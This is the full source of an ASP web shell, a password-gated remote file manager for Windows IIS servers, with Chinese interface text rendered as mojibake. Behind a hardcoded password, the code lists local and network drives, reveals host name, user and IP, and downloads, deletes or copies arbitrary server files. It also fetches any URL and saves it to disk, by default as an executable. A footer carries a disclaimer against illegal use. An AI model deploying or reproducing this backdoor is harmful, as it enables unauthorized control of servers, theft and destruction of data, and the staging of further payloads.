   <body bgcolor=#fff0f0><center><font color=green size=5><b>ÇéÌìÔ¶³ÌÎÄ¼þ¹ÜÀíÏµÍ³ V9.7</b></font></center><hr>
   <script language=vbscript>
   sub seco(path)
   document.cookie="pat=" & replace(path," ","+")
   end sub
   sub top(cop)
   dim tp
   tp=inputbox("¸´ÖÆ" & cop & "µ½:","PATH??","c:\file.exe")
   if len(trim(tp))>2 then
   document.cookie="pat=" & cop
   document.cookie="to=" & tp
   window.open("<%=url%>?id=4")
   else
   msgbox "¸´ÖÆÃ»³É¹¦!!!",4096+16,"Copy"
   end if
   end sub
   </script>
   <%
   dim url
   url= Request.ServerVariables("URL")
   if session("login")<>"true" then
              if request.form("pwd")="85390805" then
                 session("login")="true"
                 response.redirect url
                 else
   %><center><br><body  background="res://webvw.dll/win2000.jpg">
        <form action="<%=url%>" method="POST">
       <input type=password name=pwd style="background-color: #fff0f0">
       </form>Loading...<br><img src="res://browselc.dll/loadgraphic.gif"></center>
   <%
   response.end
                 end if
   end if
   on error resume next
   set fsoBrowse=CreateObject("Scripting.FileSystemObject")
   Set Snet = Server.CreateObject("WSCRIPT.NETWORK")
   Set oDrives = Snet.EnumNetworkDrives
   folderpath =Request.cookies("pat")
   if len(folderpath)<3 then  folderpath="c:\"
   if (folderpath <> "")  then
   set shell=server.createobject("shell.application")
   set fod1=shell.namespace(folderpath)
   set foditems=fod1.items

   %>
   <%
   id=request("id"):pat=folderpath

   if id="2" then
   '****ÏÂÔØÎÄ¼þ
   strFile=pat
   strFilename =strFile ' server.MapPath(strFile)
   Response.Buffer = True
   Response.Clear
   Set s = Server.CreateObject("ADODB.Stream")
   s.Open
   s.Type = 1
   on error resume next
   Set fso = Server.CreateObject("Scripting.FileSystemObject")
    if not fso.FileExists(strFilename) then
     Response.Write("<h1>Error:</h1>" & strFilename & " does not exist<p>")
     Response.End
    end if
    Set f = fso.GetFile(strFilename)
    intFilelength = f.size
   s.LoadFromFile(strFilename)
    if err then
     Response.Write("<h1>Error: </h1>" & err.Description & "<p>")
     Response.End
    end if
    Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
    Response.AddHeader "Content-Length", intFilelength
    Response.CharSet = "UTF-8"
    Response.ContentType = "application/octet-stream"
     Response.BinaryWrite s.Read
    Response.Flush
    s.Close
    Set s = Nothing
   response.end
   else
   end if

   if id="3" then
   fsoBrowse.deletefile pat
   response.write "Deleted:<br>" & pat & "!!!<br>"
   response.end
   else
   end if

   if request.form("sb")="ÏÂÔØ" then
      dim downurl,savepath
      downurl=request.form("downurl")
      savepath=request.form("savepath")
      set xml=createobject("Microsoft.XmlHttp")
      response.write "GET " & downurl & "<br>"
      response.write "Save " & savepath & "<br>"
      xml.open "GET",downurl,false
      xml.send
      response.write xml.status & "<br>"
      response.write xml.getAllResponseHeaders
     if xml.status=200 then
      set ado=createobject("adodb.stream")
      ado.mode=3
      ado.type=1
      ado.open
      ado.write (xml.responsebody)
      ado.savetofile savepath,2
      ado.close
      ado=null
      xml=null
      response.write "<br>Down Files Success !!!<br>"
     else
      response.write "error" & xml.status
     end if
   else
   end if

    if id=4 then
       Set thisfile = fsoBrowse.GetFile(pat)
       thisfile.copy request.cookies("to")
       response.write "copy " & pat & " to " & request.cookies("to") &" OK!!!"
       response.end
    else
    end if
   end if
   'Íê³É¹¦ÄÜ
   function cSize(tSize)
       if tSize>=1073741824 then
           cSize=int((tSize/1073741824)*1000)/1000 & "GB"
       elseif tSize>=1048576 then
           cSize=int((tSize/1048576)*1000)/1000 & "MB"
       elseif tSize>=1024 then
           cSize=int((tSize/1024)*1000)/1000 & "KB"
       else
           cSize=tSize & "B"
       end if
   end function
   function isfi(remark)
   if trim(remark)="ÎÄ¼þ¼Ð" then
     isfi="<font color=#ff9900 face=Wingdings size=3 ><b>1</b></font>"
   else
   isfi="<font color=#0096ff face=Wingdings size=3 ><b>2</b></font>"
   end if
   end function
   function lono(typ)
   if typ="ÎÄ¼þ¼Ð" then
    lono=""
   else
   lono="?id=2"
   end if
   end function
   %>
   <title>Ö÷»ú:<%=Snet.ComputerName%>\<%=Snet.UserName%></title>
   <%
   response.write "<font color=blue size=2>NetBios Name: \\"  & Snet.ComputerName & "\" & Snet.UserName & " IP:" & Request.ServerVariables("LOCAL_ADDR")& ":"&Request.ServerVariables("SERVER_PORT") & "<br>"
   response.write "Current Path: " & server.mappath(Request.ServerVariables("SCRIPT_NAME")) & "<br> Remote Now:" & now
   %><center>
   <form action="<%=url%>" method="POST">
   ÊäÈëÏÂÔØµÄURL:<input type=text name=downurl style="background-color: #fff0f0">±£´æÎª:<input type=text size=30 name=savepath value=<%=folderpath%>\file.exe  style="background-color: #fff0f0">
   <input type=submit name=sb value=ÏÂÔØ class=input style="background-color: #fff0f0">
   </form></center>
   <form method="post" action=<%=Request.ServerVariables("URL")%> name=gop>
   ä¯ÀÀ:<input type=text size=50 name=patt value=<%=folderpath%>  style="background-color: #fff0f0"><a href=<%=url%>  onclick="seco(gop.patt.value)">ä¯ÀÀ</a></td></form><hr>
   <%response.write "<br>±¾µØ:"
   For Each thing in fsoBrowse.Drives
   on error resume next
   if thing.driveletter="A" then
   else%>
   [<a href="<%=url%>" onclick="seco('<%=thing.DriveLetter%>:\')"><%=thing.DriveLetter%>ÅÌ:<%=cSize(thing.FreeSpace)%>/<%=cSize(thing.TotalSize)%>-<%=thing.FileSystem%></a>]
   <%end if
   NEXT
   response.write "ÍøÂç:"
   For i = 0 to oDrives.Count-1%>
   <a href="<%=url%>" onclick="seco('<%=oDrives.Item(i)%>\')"><%=oDrives.Item(i)%></a>
   <%Next%>
   <table border=1 style="FONT-SIZE: 15px"><tr><td>ÎÄ¼þÃû(<u><font color=#f700f7><b><%=folderpath%>\</b></font></u>)</td><td>ÀàÐÍ</td><td>´óÐ¡</td><td>ÈÕÆÚ</td></tr>
   <%for each co in foditems%>
   <tr><td><a href="<%=url%><%=lono(co.type)%>" onclick="seco('<%=co.path%>')"><%=isfi(co.type)%><font color=blue>&nbsp;<%=co.name%></font></a></td>
   <td><%=trim(co.type)%></td>
   <td><%=csize(co.size)%></td>
   <td><%=right(co.ModifyDate,len(co.ModifyDate)-2)%></td>
   <td><a href="<%=url%>?id=2" onclick="seco('<%=co.path%>')">ÏÂÔØ</a></td>
   <td><a href="<%=url%>?id=3" onclick="seco('<%=co.path%>')">É¾³ý</a></td>
   <td><a href="#" onclick="top('<%=co.path%>')">¸´ÖÆ</a></td></tr>
   <%next%>
   </table>
   </font><hr>
   <CENTER><img src="res://shdoclc.dll/warning.gif"></img><font color=red><u>¾¯¸æ:¶Ô·Ç·¨Ê¹ÓÃ´Ë³ÌÐò¿ÉÄÜ´øÀ´µÄÈÎºÎ²»Á¼ºó¹ûÔðÈÎ×Ô¸º!ÇëÎðÓÃÓÚ·Ç·¨ÓÃÍ¾!!!<br>¿ª·¢Õß:<i>Attrib</i>&nbsp;QQ:<i>85390805</i></u></font></center>
   </body>
